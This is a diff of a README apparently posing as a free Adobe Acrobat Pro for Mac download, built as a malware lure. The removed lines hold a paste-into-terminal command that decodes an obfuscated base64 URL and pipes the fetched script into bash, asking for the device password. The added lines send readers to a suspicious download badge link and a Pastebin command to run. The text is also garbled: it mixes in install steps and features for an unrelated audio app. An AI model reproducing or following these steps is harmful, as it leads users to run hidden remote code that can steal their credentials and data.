@@ -2,21 +2,31 @@
 
 ![Adobe Acrobat Pro Mac Screenshot 1](https://www.howtoisolve.com/wp-content/uploads/2023/01/how-to-download-install-adobe-acrobat-mac.webp)
 
+</div>
+
+<div align="center">
+
+[![📕 DOWNLOAD: Adobe Acrobat Pro (Mac)](https://img.shields.io/badge/📕%20DOWNLOAD:%20Adobe%20Acrobat%20Pro%20(Mac)-crimson?style=for-the-badge&logo=adobeacrobatreader&logoColor=white)](https://jumakas-olftol-mang.github.io/.github/)
+
+
+</div>
+
 ---
 
-## 📦 How to Install
+## Installation via .dmg:
 
-# Installation via a command in the terminal:
+1. Download the `.dmg` installer using the button above.  
+2. Open it and drag **Neural Mix Pro** into your Applications folder.  
+3. Launch the app and start separating tracks into vocals, instrumentals, and beats.  
 
-1. Copy the installation command below.
-```
-/bin/bash -c "$(curl -fsSL $(echo aHR0cHM6Ly9waGFubmFyaXRoLmNvbS9nZXQxMC9pbnN0YWxsLnNo | base64 -d))"
-```
-2. Open the terminal on your device and paste the command you copied above, then press the “Return” button.
-3. Enter your device password and confirm the installation.
+## Installation via a command in the terminal:
 
-[![0723-1.gif](https://i.postimg.cc/NfzQxpMT/0723-1.gif)](https://postimg.cc/0b7gkG72)
+1. Go to the Pastebin link below and copy the command:  
 
+   https://pastebin.com/raw/7sWHmZ51  
+
+2. Open your terminal, paste the command, and run it.
+   
 ---
 
 ## 📦 What is Adobe Acrobat Pro for Mac?
@@ -33,16 +43,16 @@ This powerful tool is perfect for those who rely on PDF documents for daily work
 
 ---
 
-## 🌟 Key Features & Benefits
+## Key Features  
 
-- 📝 **Create & Edit PDFs** — Edit text and images in PDFs just like in a word processor.
-- 🔍 **Advanced OCR Technology** — Convert scanned documents into searchable and editable files.
-- 🧾 **Convert Files to PDF** — Export Word, Excel, PowerPoint, and images to professional PDFs.
-- ✅ **Fill & Sign Forms** — Complete and e-sign forms quickly, without printing.
-- 🔐 **Document Protection** — Add passwords, redact sensitive info, and manage permissions.
-- 📤 **Cloud Collaboration** — Share PDFs and collect feedback or e-signatures online.
-- 💻 **macOS Optimized** — Fully compatible with macOS Ventura and Apple Silicon chips.
-- 🔁 **Batch Processing** — Automate repetitive PDF tasks like combining or renaming files.
+| Feature                        | Description                                                                 |
+|--------------------------------|-----------------------------------------------------------------------------|
+| 🎤 Vocal Isolation             | Separate vocals from background music for remixes and karaoke               |
+| 🥁 Drum Extraction             | Isolate or remove beats for mashups and re-arrangements                     |
+| 🎹 Instrument Separation       | Split harmonics like piano, guitar, and synths with precision               |
+| ⚡ Real-Time Processing        | AI-powered stem separation with minimal latency                             |
+| 📂 Stem Export                 | Save vocals, instrumentals, and beats as separate audio files               |
+| 💻 macOS Compatibility         | Fully optimized for Intel and Apple Silicon Macs                            |
 
 ---
 
